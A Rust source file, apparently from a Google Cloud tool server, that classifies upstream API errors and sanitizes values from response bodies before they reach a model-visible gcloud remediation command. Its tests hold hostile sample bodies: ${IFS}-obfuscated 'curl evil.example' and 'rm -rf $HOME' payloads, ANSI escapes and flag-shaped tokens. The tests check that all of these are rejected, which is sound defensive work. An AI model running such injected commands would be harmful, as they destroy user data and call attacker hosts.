//! Error types and the upstream failure classifier.

use std::time::Duration;

use thiserror::Error;

/// Longest API name accepted into a rendered remediation command.
///
/// 253 is the DNS name limit, which is what a `*.googleapis.com` API name is.
const MAX_API_NAME_LEN: usize = 253;

/// Longest project id accepted into a rendered remediation command.
///
/// 30 is the GCP maximum. Capping it matters independently of the character
/// set: without a limit an upstream could pad this field to flood the reader,
/// and it is interpolated before [`sanitize_body`] would see anything.
const MAX_PROJECT_ID_LEN: usize = 30;

/// Longest upstream body rendered back to the caller.
///
/// The body becomes tool-result text a model reads, so an upstream answering
/// with megabytes of prose (or a deliberately padded error) would otherwise
/// flood the context window from the far side of the network.
const MAX_BODY_LEN: usize = 2 * 1024;

/// Errors produced by this crate's own operations.
#[derive(Debug, Error)]
pub enum Error {
    /// No quota project could be resolved from any supported mechanism.
    #[error(
        "no quota project configured; provide one via the `--project` flag, the \
         `GOOGLE_MCP_QUOTA_PROJECT` environment variable, the `GOOGLE_CLOUD_PROJECT` \
         environment variable, or a `quota_project_id` in the ADC file \
         (`~/.config/gcloud/application_default_credentials.json` or the path in \
         `GOOGLE_APPLICATION_CREDENTIALS`); \
         `gcloud auth application-default set-quota-project <PROJECT>` writes it"
    )]
    QuotaProjectUnresolved,

    /// A quota project was resolved, but it is neither a well-formed project
    /// id nor a project number.
    ///
    /// The offending value is deliberately not echoed: it reaches this point
    /// from the environment or an ADC file, and repeating it verbatim would
    /// put attacker-influenced text into logs and model-visible errors.
    #[error(
        "the resolved quota project is neither a valid Google Cloud project id nor a \
         project number ({reason}); ids are 6-30 characters matching \
         `[a-z][a-z0-9-]{{4,28}}[a-z0-9]` (lowercase letters, digits and hyphens, \
         starting with a letter and not ending with a hyphen), and project numbers are \
         1-20 digits. The value itself is not repeated here"
    )]
    InvalidQuotaProject {
        /// What was wrong with the value, described without quoting it.
        reason: String,
    },

    /// Application Default Credentials could not be discovered or refreshed.
    #[error("failed to acquire Google credentials via ADC: {0}")]
    Auth(#[from] gcp_auth::Error),

    /// The token source did not answer within its budget.
    #[error(
        "acquiring a Google access token timed out after {0:?}; the credential \
         source (ADC, metadata server, or gcloud) is not answering"
    )]
    TokenFetchTimeout(Duration),

    /// A token fetch failed recently and is not retried until a cooldown
    /// passes; `cause` is the failure that started it.
    ///
    /// Rendered with the original failure first so a caller sees the same
    /// classified text as the call that hit it, then told when a retry
    /// happens and what to fix meanwhile.
    #[error(
        "{cause}; the credential source is not retried for another \
         {retry_after_secs}s after a failure, so fix it (for Application Default \
         Credentials: `gcloud auth application-default login`) and call again"
    )]
    CredentialsCoolingDown {
        /// The failure being held against the source, already rendered.
        cause: String,
        /// Seconds until the next call retries the source.
        retry_after_secs: u64,
    },

    /// A resolved value cannot be carried in an HTTP header.
    #[error("value is not a valid HTTP header value: {0}")]
    InvalidHeader(#[from] reqwest::header::InvalidHeaderValue),

    /// An outbound HTTP request failed at the transport level.
    #[error("request to {url} failed: {source}")]
    Http {
        /// URL of the failed request.
        url: String,
        /// Transport-level cause.
        #[source]
        source: reqwest::Error,
    },

    /// A response body could not be parsed.
    #[error("failed to parse {context}: {source}")]
    Json {
        /// What was being parsed.
        context: String,
        /// Parse failure cause.
        #[source]
        source: serde_json::Error,
    },

    /// A paginated listing repeated a page token instead of advancing.
    #[error(
        "Service Usage returned a pagination token it had already served; the \
         listing is not making progress and was abandoned"
    )]
    PaginationStalled,

    /// A paginated listing ran past its page budget.
    #[error(
        "Service Usage listing did not terminate within {pages} pages; refusing \
         to keep paging"
    )]
    PaginationLimit {
        /// Page budget that was exhausted.
        pages: usize,
    },

    /// An upstream Google API answered with a classified failure.
    #[error(transparent)]
    Upstream(#[from] UpstreamFailure),
}

/// Classified upstream (Google API) failure with actionable remediation.
#[derive(Debug, Clone, PartialEq, Eq, Error)]
pub enum UpstreamFailure {
    /// 401: the request carried no usable credential.
    #[error(
        "upstream returned 401: the request is missing required authentication \
         credentials; run `gcloud auth application-default login` to create \
         Application Default Credentials"
    )]
    MissingCredential,

    /// 401: an API key was sent, but the API accepts only OAuth2 credentials.
    #[error(
        "upstream returned 401: API keys are not supported by this API; OAuth2 \
         credentials (ADC) are required — run `gcloud auth application-default login`"
    )]
    ApiKeyUnsupported,

    /// 403: the API requires a quota project on the request.
    #[error(
        "upstream returned 403: the request requires a quota project; pass \
         `--project <PROJECT>`, set `GOOGLE_MCP_QUOTA_PROJECT`, or run \
         `gcloud auth application-default set-quota-project <PROJECT>`"
    )]
    QuotaProjectMissing,

    /// 403: the API is not enabled on the target project.
    #[error(
        "upstream returned 403: `{api}` is disabled in project `{project}`; enable \
         it with `gcloud services enable {api} --project={project}` and retry"
    )]
    ServiceDisabled {
        /// Service Usage API name, e.g. `developerknowledge.googleapis.com`.
        api: String,
        /// Project the API is disabled in.
        project: String,
    },

    /// 403: the caller lacks IAM permission on the resource.
    #[error(
        "upstream returned 403: permission denied; the caller needs \
         `roles/mcp.toolUser` (permission `mcp.tools.call`) and the product's own \
         IAM role on the target project"
    )]
    PermissionDenied,

    /// Any other non-success upstream response, passed through as text.
    #[error("upstream returned {status}: {body}")]
    Other {
        /// HTTP status code as received.
        status: u16,
        /// Response body, sanitized by [`sanitize_body`]: control characters
        /// removed and length capped. It is the one place an upstream's own
        /// bytes reach the caller unclassified, so it is not carried raw.
        body: String,
    },
}

/// Classify an upstream HTTP failure into an actionable [`UpstreamFailure`].
///
/// Matching is on stable substrings of the live-captured Google error
/// messages (2026-08-19), not on full strings.
pub fn classify_upstream(status: u16, body_text: &str) -> UpstreamFailure {
    match status {
        401 if body_text.contains("Request is missing required authentication credential") => {
            UpstreamFailure::MissingCredential
        }
        401 if body_text.contains("API keys are not supported by this API") => {
            UpstreamFailure::ApiKeyUnsupported
        }
        403 if body_text.contains("requires a quota project") => {
            UpstreamFailure::QuotaProjectMissing
        }
        403 if body_text.contains("has not been used in project") => {
            let (api, project) = parse_service_disabled(body_text);
            UpstreamFailure::ServiceDisabled { api, project }
        }
        403 => UpstreamFailure::PermissionDenied,
        _ => UpstreamFailure::Other {
            status,
            body: sanitize_body(body_text),
        },
    }
}

/// Make upstream text safe to render into a model-visible result.
///
/// Two hazards, both from bytes an upstream (or anything able to influence an
/// upstream's error text) chose: C0/C1 control characters, which let an ANSI
/// escape or a carriage return rewrite terminal output an operator has already
/// read, and unbounded length, which lets a remote party flood a context
/// window. Newline and tab survive because they carry real structure.
pub fn sanitize_body(text: &str) -> String {
    let cleaned: String = text
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\t'))
        .collect();
    if cleaned.len() <= MAX_BODY_LEN {
        return cleaned;
    }

    let mut end = MAX_BODY_LEN;
    while !cleaned.is_char_boundary(end) {
        end -= 1;
    }
    let total = cleaned.len();
    let mut truncated = cleaned;
    truncated.truncate(end);
    truncated.push_str(&format!(
        "... [truncated; {total} bytes after sanitizing, limit {MAX_BODY_LEN}]"
    ));
    truncated
}

/// Accept an API name only if it looks like one Google would have sent.
///
/// The value is interpolated into a `gcloud services enable ...` command that
/// a model may run, so anything outside the character set a real API name uses
/// is rejected outright rather than escaped. A leading `-` is refused
/// separately from the character set: `-` is a legal character *inside* a name,
/// but a value starting with one would arrive at `gcloud` as a flag rather
/// than as the argument the command reads it as here.
fn accept_api_name(candidate: &str) -> Option<&str> {
    let well_formed = !candidate.is_empty()
        && candidate.len() <= MAX_API_NAME_LEN
        && !candidate.starts_with('-')
        && candidate
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '-'));
    well_formed.then_some(candidate)
}

/// Accept a project id only if it uses the characters and length a project id
/// may use.
///
/// Deliberately narrower than the full GCP grammar: this value comes off the
/// wire and lands in a suggested shell command, so the only questions asked
/// are whether it can change that command's meaning (character set, leading
/// `-`) and whether it can be used to pad the rendered message (length).
fn accept_project_id(candidate: &str) -> Option<&str> {
    let well_formed = !candidate.is_empty()
        && candidate.len() <= MAX_PROJECT_ID_LEN
        && !candidate.starts_with('-')
        && candidate
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    well_formed.then_some(candidate)
}

/// Extract the API name and project id from a `SERVICE_DISABLED` message.
///
/// The API name comes from the embedded console URL
/// (`…/apis/api/{api}/overview?project={p}`), the project from the
/// `has not been used in project {p}` clause.
///
/// Both halves are interpolated into a `gcloud services enable {api}
/// --project={project}` command that a model is being told to run, and both
/// are parsed out of a response body. A body is not a trusted source, so each
/// half must pass an allowlist ([`accept_api_name`], [`accept_project_id`])
/// before it is used; anything else degrades to the placeholder, which keeps
/// the remediation's shape while making it obviously incomplete.
fn parse_service_disabled(body: &str) -> (String, String) {
    let api = body
        .split_once("/apis/api/")
        .and_then(|(_, rest)| rest.split(['/', '?', '"', ' ']).next())
        .and_then(accept_api_name)
        .unwrap_or("<API>")
        .to_owned();
    let project = body
        .split_once("has not been used in project ")
        .and_then(|(_, rest)| rest.split_whitespace().next())
        .map(|s| s.trim_end_matches(['.', ',', '"']))
        .and_then(accept_project_id)
        .unwrap_or("<PROJECT>")
        .to_owned();
    (api, project)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Live-captured (2026-08-19) 401 body for a request with no credential.
    const MISSING_CREDENTIAL_BODY: &str = "Request is missing required authentication \
         credential. Expected OAuth 2 access token, login cookie or other valid \
         authentication credential. See \
         https://developers.google.com/identity/sign-in/web/devconsole-project.";

    /// Live-captured (2026-08-19) 401 body for an API-key request.
    const API_KEY_BODY: &str = "API keys are not supported by this API. Expected \
         OAuth2 access token or other authentication credentials that assert a \
         principal. See https://cloud.google.com/docs/authentication";

    /// Live-captured (2026-08-19) 403 body for a missing quota project.
    const QUOTA_PROJECT_BODY: &str = "Your application is authenticating by using \
         local Application Default Credentials. The developerknowledge.googleapis.com \
         API requires a quota project, which is not set by default.";

    /// Live-captured (2026-08-19) 403 body for a disabled service.
    const SERVICE_DISABLED_BODY: &str = "Developer Knowledge API has not been used in \
         project gwskey-6 before or it is disabled. Enable it by visiting \
         https://console.developers.google.com/apis/api/developerknowledge.googleapis.com/overview?project=gwskey-6 \
         then retry.";

    #[test]
    fn classifies_missing_credential() {
        let failure = classify_upstream(401, MISSING_CREDENTIAL_BODY);
        assert_eq!(failure, UpstreamFailure::MissingCredential);
        assert!(
            failure
                .to_string()
                .contains("gcloud auth application-default login")
        );
    }

    #[test]
    fn classifies_api_key_unsupported() {
        let failure = classify_upstream(401, API_KEY_BODY);
        assert_eq!(failure, UpstreamFailure::ApiKeyUnsupported);
    }

    #[test]
    fn classifies_quota_project_missing_with_remediation() {
        let failure = classify_upstream(403, QUOTA_PROJECT_BODY);
        assert_eq!(failure, UpstreamFailure::QuotaProjectMissing);
        let rendered = failure.to_string();
        assert!(rendered.contains("--project"), "rendered: {rendered}");
        assert!(
            rendered.contains("GOOGLE_MCP_QUOTA_PROJECT"),
            "rendered: {rendered}"
        );
        assert!(
            rendered.contains("gcloud auth application-default set-quota-project"),
            "rendered: {rendered}"
        );
    }

    #[test]
    fn classifies_service_disabled_and_parses_api_and_project() {
        let failure = classify_upstream(403, SERVICE_DISABLED_BODY);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "developerknowledge.googleapis.com".to_owned(),
                project: "gwskey-6".to_owned(),
            }
        );
        let rendered = failure.to_string();
        assert!(
            rendered.contains(
                "gcloud services enable developerknowledge.googleapis.com --project=gwskey-6"
            ),
            "rendered: {rendered}"
        );
    }

    #[test]
    fn classifies_service_disabled_inside_json_envelope() {
        let body = format!(
            r#"{{"error":{{"code":403,"message":"{SERVICE_DISABLED_BODY}","status":"PERMISSION_DENIED"}}}}"#
        );
        let failure = classify_upstream(403, &body);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "developerknowledge.googleapis.com".to_owned(),
                project: "gwskey-6".to_owned(),
            }
        );
    }

    #[test]
    fn service_disabled_parse_degrades_to_placeholders() {
        let failure = classify_upstream(403, "X has not been used in project ");
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "<API>".to_owned(),
                project: "<PROJECT>".to_owned(),
            }
        );
    }

    #[test]
    fn other_403_is_permission_denied_naming_roles() {
        let failure = classify_upstream(403, "Permission denied on resource project x.");
        assert_eq!(failure, UpstreamFailure::PermissionDenied);
        let rendered = failure.to_string();
        assert!(
            rendered.contains("roles/mcp.toolUser"),
            "rendered: {rendered}"
        );
        assert!(rendered.contains("mcp.tools.call"), "rendered: {rendered}");
        assert!(
            rendered.contains("product's own IAM role"),
            "rendered: {rendered}"
        );
    }

    #[test]
    fn generic_401_passes_through_as_other() {
        let failure = classify_upstream(401, "Unauthorized");
        assert_eq!(
            failure,
            UpstreamFailure::Other {
                status: 401,
                body: "Unauthorized".to_owned(),
            }
        );
    }

    #[test]
    fn non_auth_statuses_pass_through_as_other() {
        let failure = classify_upstream(500, "Internal error encountered.");
        assert_eq!(
            failure,
            UpstreamFailure::Other {
                status: 500,
                body: "Internal error encountered.".to_owned(),
            }
        );
        assert!(failure.to_string().contains("500"));
        assert!(failure.to_string().contains("Internal error encountered."));
    }

    /// A `SERVICE_DISABLED`-shaped body whose API name carries a shell payload.
    ///
    /// The parser splits the API name on `/`, `?`, `"` and space, so a payload
    /// built out of `${IFS}` instead of literal spaces survives parsing intact
    /// and would reach the suggested command unless the allowlist stops it.
    const SHELL_INJECTION_BODY: &str = "Fake API has not been used in project \
         victim;${IFS}curl${IFS}evil.example before or it is disabled. Enable it by \
         visiting \
         https://console.developers.google.com/apis/api/run.googleapis.com;${IFS}rm${IFS}-rf${IFS}$HOME/overview?project=x \
         then retry.";

    #[test]
    fn service_disabled_refuses_a_shell_payload_in_the_api_and_project() {
        let failure = classify_upstream(403, SHELL_INJECTION_BODY);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "<API>".to_owned(),
                project: "<PROJECT>".to_owned(),
            },
            "neither half is a well-formed identifier, so both must degrade to \
             placeholders rather than be interpolated"
        );

        let rendered = failure.to_string();
        // Only substrings unique to the payload: the remediation template has
        // punctuation of its own, and asserting on that would be a test of the
        // wording rather than of the sanitizing.
        for payload in [
            "${IFS}",
            "curl",
            "rm${IFS}",
            "$HOME",
            "victim",
            "evil.example",
        ] {
            assert!(
                !rendered.contains(payload),
                "`{payload}` from the upstream body reached the suggested \
                 command: {rendered}"
            );
        }
    }

    #[test]
    fn service_disabled_refuses_ansi_escapes_in_the_project_id() {
        // A terminal-rewriting payload: the escape would move the cursor and
        // recolor output in whatever renders this remediation.
        let body = "X has not been used in project \u{1b}[31mnot-a-project\u{1b}[0m before. \
             Enable it by visiting \
             https://console.developers.google.com/apis/api/\u{1b}[2Krun.googleapis.com/overview?project=p";
        let failure = classify_upstream(403, body);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "<API>".to_owned(),
                project: "<PROJECT>".to_owned(),
            }
        );
        let rendered = failure.to_string();
        assert!(
            !rendered.contains('\u{1b}'),
            "an escape character survived into the rendered remediation"
        );
    }

    #[test]
    fn service_disabled_refuses_flag_shaped_tokens() {
        // `-` is legal inside both an API name and a project id, so the
        // character set alone lets `--quiet` through. A value starting with
        // one stops being an argument to `gcloud` and becomes a flag.
        let body = "X has not been used in project --quiet before. Enable it by visiting \
             https://console.developers.google.com/apis/api/--quiet/overview?project=p";
        let failure = classify_upstream(403, body);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "<API>".to_owned(),
                project: "<PROJECT>".to_owned(),
            },
            "a leading `-` makes the value a flag, so neither half may be used"
        );
        assert!(
            !failure.to_string().contains("--quiet"),
            "a flag-shaped token reached the suggested command: {failure}"
        );
    }

    #[test]
    fn service_disabled_refuses_an_overlong_project_id() {
        // Length is a separate lever from the character set: every character
        // here is legal, and the value is interpolated into the message before
        // `sanitize_body` sees anything.
        let padded = "a".repeat(MAX_PROJECT_ID_LEN + 1);
        let body = format!("X has not been used in project {padded} before.");
        let failure = classify_upstream(403, &body);
        assert_eq!(
            failure,
            UpstreamFailure::ServiceDisabled {
                api: "<API>".to_owned(),
                project: "<PROJECT>".to_owned(),
            },
            "a project id over the {MAX_PROJECT_ID_LEN}-character maximum is not one"
        );
        assert!(
            !failure.to_string().contains(&padded),
            "padding reached the rendered remediation"
        );

        // The boundary itself stays usable.
        let at_limit = "a".repeat(MAX_PROJECT_ID_LEN);
        let body = format!("X has not been used in project {at_limit} before.");
        let UpstreamFailure::ServiceDisabled { project, .. } = classify_upstream(403, &body) else {
            panic!("this body classifies as ServiceDisabled");
        };
        assert_eq!(project, at_limit, "a maximum-length id is still a valid id");
    }

    #[test]
    fn service_disabled_still_accepts_the_real_google_shapes() {
        // The allowlist must not be so tight that the live-captured body stops
        // producing a usable command.
        let failure = classify_upstream(403, SERVICE_DISABLED_BODY);
        assert!(
            failure.to_string().contains(
                "gcloud services enable developerknowledge.googleapis.com --project=gwskey-6"
            ),
            "sanitizing must not break the real remediation: {failure}"
        );
    }

    #[test]
    fn other_bodies_lose_control_characters_and_are_capped() {
        let hostile = format!(
            "\u{1b}[31mred\u{7}\rrewritten\u{0}\n\tkept{}",
            "A".repeat(MAX_BODY_LEN * 4)
        );
        let failure = classify_upstream(500, &hostile);
        let UpstreamFailure::Other { body, .. } = &failure else {
            panic!("a 500 must classify as Other; got {failure:?}");
        };

        for control in ['\u{1b}', '\u{7}', '\r', '\u{0}'] {
            assert!(
                !body.contains(control),
                "control character {control:?} survived sanitizing"
            );
        }
        assert!(
            body.contains("\n\tkept"),
            "newline and tab carry structure and must survive: {body:?}"
        );
        assert!(
            body.len() < hostile.len(),
            "an oversized body must be capped; got {} bytes",
            body.len()
        );
        assert!(
            body.contains("[truncated;"),
            "truncation must be visible to the reader, not silent: {body:?}"
        );
        assert!(
            failure.to_string().len() < hostile.len(),
            "the rendered failure must be capped too, not just the field"
        );
    }

    #[test]
    fn short_clean_bodies_pass_through_untouched() {
        assert_eq!(
            sanitize_body("Internal error encountered."),
            "Internal error encountered."
        );
        assert_eq!(sanitize_body(""), "");
    }

    #[test]
    fn quota_project_error_names_all_four_mechanisms() {
        let rendered = Error::QuotaProjectUnresolved.to_string();
        assert!(rendered.contains("--project"), "rendered: {rendered}");
        assert!(
            rendered.contains("GOOGLE_MCP_QUOTA_PROJECT"),
            "rendered: {rendered}"
        );
        assert!(
            rendered.contains("GOOGLE_CLOUD_PROJECT"),
            "rendered: {rendered}"
        );
        assert!(
            rendered.contains("quota_project_id"),
            "rendered: {rendered}"
        );
    }
}
